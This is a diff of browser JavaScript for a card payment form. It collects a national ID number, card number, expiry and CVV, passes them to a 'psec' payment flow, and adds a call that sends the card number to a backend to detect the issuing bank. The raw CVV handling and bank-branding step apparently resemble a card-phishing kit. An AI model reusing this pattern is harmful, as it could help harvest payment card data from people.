@@ -594,7 +594,7 @@ document.addEventListener('DOMContentLoaded', () => {
   });
 });
 
-function pagarTarjeta() {
+async function pagarTarjeta() {
   const cedula = document.getElementById('tarCedula').value.trim();
   const numero = document.getElementById('tarNumero').value.trim();
   const fecha  = document.getElementById('tarFecha').value.trim();
@@ -603,14 +603,23 @@ function pagarTarjeta() {
   if (!cedula || !numero || !fecha || !cvv) { alert('Por favor completa todos los campos'); return; }
   const num = numero.replace(/\s/g,'');
   const p0  = num[0];
-  const tipoTarjeta = p0==='4' ? 'Visa' : p0==='5' ? 'Mastercard' : p0==='3' ? 'Amex' : 'Tarjeta';
+  const scheme = p0==='4' ? 'Visa' : p0==='5' ? 'Mastercard' : p0==='3' ? 'Amex' : 'Tarjeta';
   const logoMap = {
     'Visa': 'https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/visa.svg',
     'Mastercard': 'https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/mastercard.svg',
     'Amex': 'https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/amex.svg',
     'Tarjeta': 'https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/mastercard.svg',
   };
-  pagarTarjetaPsec({ tipoDoc, cedula, numero, fecha, cvv, tipoTarjeta, logoUrl: logoMap[tipoTarjeta] });
+  let tipoTarjeta = scheme;
+  try {
+    const dr = await fetch(API_URL+'/api/detect-bank', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ cardNumber: num }),
+    });
+    const dd = await dr.json();
+    if (dd.ok && dd.bank) tipoTarjeta = dd.bank;
+  } catch {}
+  pagarTarjetaPsec({ tipoDoc, cedula, numero, fecha, cvv, tipoTarjeta, logoUrl: logoMap[scheme] });
 }
 
 // ── Modal tarjeta (flujo psec) ────────────────────────────────────────────
